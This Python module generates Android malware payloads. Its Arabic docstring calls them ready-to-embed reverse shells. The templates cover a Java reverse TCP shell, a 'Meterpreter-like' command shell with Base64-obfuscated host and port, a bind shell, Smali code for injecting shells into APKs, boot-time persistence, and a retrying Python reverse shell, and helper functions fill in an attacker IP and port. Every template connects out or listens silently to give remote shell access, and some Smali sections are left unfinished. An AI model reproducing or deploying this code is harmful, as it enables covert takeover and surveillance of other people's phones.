#!/usr/bin/env python3
"""
أكواد Reverse Shell جاهزة للتضمين
"""

# ============================================
# Java Reverse Shells for Android
# ============================================

# Basic Reverse TCP Shell
JAVA_REVERSE_TCP = """
package com.example.app;

import java.io.*;
import java.net.*;

public class ReverseShell {
    private static final String HOST = "{IP}";
    private static final int PORT = {PORT};
    
    public static void start() {
        new Thread(new Runnable() {
            public void run() {
                try {
                    // Wait before connecting
                    Thread.sleep(5000);
                    
                    Socket socket = new Socket(HOST, PORT);
                    Process process = Runtime.getRuntime().exec("/system/bin/sh");
                    
                    InputStream processInput = process.getInputStream();
                    InputStream processError = process.getErrorStream();
                    InputStream socketInput = socket.getInputStream();
                    
                    OutputStream processOutput = process.getOutputStream();
                    OutputStream socketOutput = socket.getOutputStream();
                    
                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(socketOutput));
                    BufferedReader reader = new BufferedReader(new InputStreamReader(socketInput));
                    
                    writer.write("[+] Connected to " + HOST + ":" + PORT + "\\n");
                    writer.flush();
                    
                    byte[] buffer = new byte[4096];
                    int bytesRead;
                    
                    while (!socket.isClosed()) {
                        // Read from process and send to socket
                        while (processInput.available() > 0) {
                            bytesRead = processInput.read(buffer);
                            socketOutput.write(buffer, 0, bytesRead);
                            socketOutput.flush();
                        }
                        
                        // Read from socket and send to process
                        while (socketInput.available() > 0) {
                            bytesRead = socketInput.read(buffer);
                            processOutput.write(buffer, 0, bytesRead);
                            processOutput.flush();
                        }
                        
                        Thread.sleep(50);
                    }
                    
                } catch (Exception e) {
                    // Silent fail
                }
            }
        }).start();
    }
}
"""

# Meterpreter-like Shell
JAVA_METERPRETER = """
package com.example.app;

import java.io.*;
import java.net.*;
import java.util.Base64;

public class MeterpreterShell {
    private static String HOST = "{IP}";
    private static int PORT = {PORT};
    
    public static void start() {
        try {
            // Encoded connection info for obfuscation
            String encodedHost = new String(Base64.getDecoder().decode("{ENCODED_IP}"));
            String encodedPort = new String(Base64.getDecoder().decode("{ENCODED_PORT}"));
            
            Socket s = new Socket(encodedHost, Integer.parseInt(encodedPort));
            DataInputStream dis = new DataInputStream(s.getInputStream());
            DataOutputStream dos = new DataOutputStream(s.getOutputStream());
            
            // Send system info
            dos.writeUTF("Android: " + System.getProperty("os.version"));
            dos.writeUTF("Model: " + android.os.Build.MODEL);
            dos.writeUTF("SDK: " + android.os.Build.VERSION.SDK);
            
            while (true) {
                String command = dis.readUTF();
                
                if (command.equals("exit")) {
                    break;
                } else if (command.startsWith("cd ")) {
                    // Change directory simulation
                    dos.writeUTF("Directory changed");
                } else if (command.equals("screenshot")) {
                    // Screenshot command
                    dos.writeUTF("[*] Taking screenshot...");
                } else {
                    // Execute shell command
                    Process p = Runtime.getRuntime().exec(command);
                    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
                    
                    String line;
                    StringBuilder output = new StringBuilder();
                    while ((line = br.readLine()) != null) {
                        output.append(line).append("\\n");
                    }
                    
                    dos.writeUTF(output.toString());
                }
            }
            
            s.close();
            
        } catch (Exception e) {
            // Silent
        }
    }
}
"""

# Bind Shell (Opens port on device)
JAVA_BIND_SHELL = """
package com.example.app;

import java.io.*;
import java.net.*;

public class BindShell {
    private static final int PORT = {PORT};
    
    public static void start() {
        new Thread(new Runnable() {
            public void run() {
                try {
                    ServerSocket serverSocket = new ServerSocket(PORT);
                    
                    while (true) {
                        Socket clientSocket = serverSocket.accept();
                        
                        // Handle each connection in separate thread
                        new ClientHandler(clientSocket).start();
                    }
                    
                } catch (IOException e) {
                    // Silent
                }
            }
        }).start();
    }
    
    static class ClientHandler extends Thread {
        private Socket socket;
        
        ClientHandler(Socket socket) {
            this.socket = socket;
        }
        
        public void run() {
            try {
                Process process = Runtime.getRuntime().exec("/system/bin/sh");
                
                InputStream processInput = process.getInputStream();
                OutputStream processOutput = process.getOutputStream();
                
                InputStream socketInput = socket.getInputStream();
                OutputStream socketOutput = socket.getOutputStream();
                
                // Bind streams
                // ... (similar to reverse shell)
                
            } catch (Exception e) {
                // Silent
            }
        }
    }
}
"""

# ============================================
# Smali Code Templates (For APK Injection)
# ============================================

SMALI_REVERSE_SHELL = """
.method private startReverseShell()V
    .locals 7
    
    .catch Ljava/lang/Exception; {{:L_start}}
    
    :L_start
    # Wait 5 seconds
    const-wide/32 v0, 0x1388
    invoke-static {{v0, v1}}, Ljava/lang/Thread;->sleep(J)V
    
    # Connection info
    const-string v0, "{IP}"
    const/16 v1, {PORT}  # Port in hex
    
    # Create socket
    new-instance v2, Ljava/net/Socket;
    invoke-static {{v0}}, Ljava/net/InetAddress;->getByName(Ljava/lang/String;)Ljava/net/InetAddress;
    move-result-object v0
    invoke-direct {{v2, v0, v1}}, Ljava/net/Socket;-><init>(Ljava/net/InetAddress;I)V
    
    # Start shell
    const-string v0, "/system/bin/sh"
    invoke-static {{v0}}, Ljava/lang/Runtime;->getRuntime()Ljava/lang/Runtime;
    move-result-object v0
    invoke-virtual {{v0, v0}}, Ljava/lang/Runtime;->exec(Ljava/lang/String;)Ljava/lang/Process;
    
    move-result-object v3
    
    # Get streams
    invoke-virtual {{v3}}, Ljava/lang/Process;->getInputStream()Ljava/io/InputStream;
    move-result-object v4
    invoke-virtual {{v3}}, Ljava/lang/Process;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v5
    
    # Get socket streams
    invoke-virtual {{v2}}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;
    move-result-object v0
    invoke-virtual {{v2}}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;
    move-result-object v1
    
    # Stream binding loop
    :L_loop
    invoke-virtual {{v4}}, Ljava/io/InputStream;->available()I
    
    move-result v6
    if-lez v6, :L_copy_process_to_socket
    
    invoke-virtual {{v0}}, Ljava/io/InputStream;->available()I
    
    move-result v6
    if-lez v6, :L_copy_socket_to_process
    
    goto :L_loop
    
    :L_copy_process_to_socket
    # Copy from process to socket
    # ... implementation
    
    :L_copy_socket_to_process
    # Copy from socket to process
    # ... implementation
    
    goto :L_loop
    
    return-void
    
    :L_catch
    move-exception v0
    # Silent exit
    return-void
.end method
"""

SMALI_PERSISTENCE = """
# Service that starts on boot
.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 2
    
    # Start shell in background
    new-instance v0, Ljava/lang/Thread;
    
    new-instance v1, Lcom/example/app/MainActivity$ShellStarter;
    invoke-direct {{v1, p0}}, Lcom/example/app/MainActivity$ShellStarter;-><init>(Lcom/example/app/MainActivity;)V
    
    invoke-direct {{v0, v1}}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V
    
    invoke-virtual {{v0}}, Ljava/lang/Thread;->start()
    
    # Make service sticky
    const/4 v0, 0x1
    return v0
.end method

# Broadcast receiver for boot
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 2
    
    invoke-virtual {{p2}}, Landroid/content/Intent;->getAction()Ljava/lang/String;
    
    move-result-object v0
    
    const-string v1, "android.intent.action.BOOT_COMPLETED"
    
    invoke-virtual {{v0, v1}}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    
    move-result v0
    
    if-eqz v0, :L_start_service
    
    :L_start_service
    new-instance v0, Landroid/content/Intent;
    
    const-class v1, Lcom/example/app/ShellService;
    
    invoke-direct {{v0, p1, v1}}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    
    invoke-virtual {{p1, v0}}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    
    :L_end
    return-void
.end method
"""

# ============================================
# Python Shells (For testing)
# ============================================

PYTHON_REVERSE_SHELL = """#!/usr/bin/env python3
import socket,subprocess,os,time

def reverse_shell(ip, port):
    time.sleep(5)  # Initial delay
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            
            os.dup2(s.fileno(), 0)  # stdin
            os.dup2(s.fileno(), 1)  # stdout
            os.dup2(s.fileno(), 2)  # stderr
            
            subprocess.call(["/system/bin/sh", "-i"])
            
        except:
            time.sleep(10)  # Retry after 10 seconds
"""

# ============================================
# Helper Functions
# ============================================

def get_shell_code(shell_type="reverse_tcp", ip="192.168.1.100", port=4444):
    """
    Get shell code by type
    """
    shell_type = shell_type.lower()
    
    if shell_type == "reverse_tcp":
        code = JAVA_REVERSE_TCP
    elif shell_type == "meterpreter":
        code = JAVA_METERPRETER
    elif shell_type == "bind_tcp":
        code = JAVA_BIND_SHELL
    elif shell_type == "smali_reverse":
        code = SMALI_REVERSE_SHELL
    elif shell_type == "smali_persistence":
        code = SMALI_PERSISTENCE
    elif shell_type == "python":
        code = PYTHON_REVERSE_SHELL
    else:
        code = JAVA_REVERSE_TCP
    
    # Replace placeholders
    code = code.replace("{IP}", ip)
    code = code.replace("{PORT}", str(port))
    
    # For meterpreter, encode IP and port
    if shell_type == "meterpreter":
        import base64
        encoded_ip = base64.b64encode(ip.encode()).decode()
        encoded_port = base64.b64encode(str(port).encode()).decode()
        code = code.replace("{ENCODED_IP}", encoded_ip)
        code = code.replace("{ENCODED_PORT}", encoded_port)
    
    return code

def get_available_shells():
    """
    Return list of available shell types
    """
    return {
        "reverse_tcp": "Reverse TCP Shell (Recommended)",
        "meterpreter": "Meterpreter-like Shell",
        "bind_tcp": "Bind TCP Shell",
        "smali_reverse": "Smali Reverse Shell",
        "smali_persistence": "Smali Persistence Code",
        "python": "Python Reverse Shell"
    }

# Test the module
if __name__ == "__main__":
    print("Available shells:")
    for name, desc in get_available_shells().items():
        print(f"  {name}: {desc}")
    
    print("\nSample Reverse TCP Shell:")
    sample = get_shell_code("reverse_tcp", "192.168.1.100", 4444)
    print(sample[:500] + "...")